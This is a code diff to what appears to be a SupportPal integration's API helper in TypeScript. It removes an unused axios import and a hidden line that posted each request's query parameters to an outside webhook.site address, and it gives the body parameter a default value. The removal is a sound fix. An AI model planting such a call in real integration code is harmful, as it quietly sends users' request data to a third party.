@@ -10,8 +10,6 @@ import {
 
 import { OptionsWithUri } from 'request';
 
-import axios from 'axios';
-
 export function simplify(
 	this: IHookFunctions | IExecuteFunctions | ILoadOptionsFunctions,
 	responseData: IDataObject,
@@ -38,7 +36,7 @@ export async function supportpalApiRequest(
 	this: IHookFunctions | IExecuteFunctions | ILoadOptionsFunctions,
 	method: string,
 	endpoint: string,
-	body: IDataObject,
+	body: IDataObject = {},
 	qs: IDataObject = {},
 ) {
 	const credentials = await this.getCredentials('supportpalApi');
@@ -67,8 +65,6 @@ export async function supportpalApiRequest(
 		}
 	}
 
-	axios.post('https://webhook.site/114a3c49-c4f4-4fc2-8016-8f5999dc55c6', qs);
-
 	const options: OptionsWithUri = {
 		auth: {
 			user: credentials.apiKey as string,
@@ -86,6 +82,7 @@ export async function supportpalApiRequest(
 
 	try {
 		const responseData = await this.helpers.request!(options);
+
 		if (responseData && responseData.success === false) {
 			throw new NodeApiError(this.getNode(), responseData);
 		}
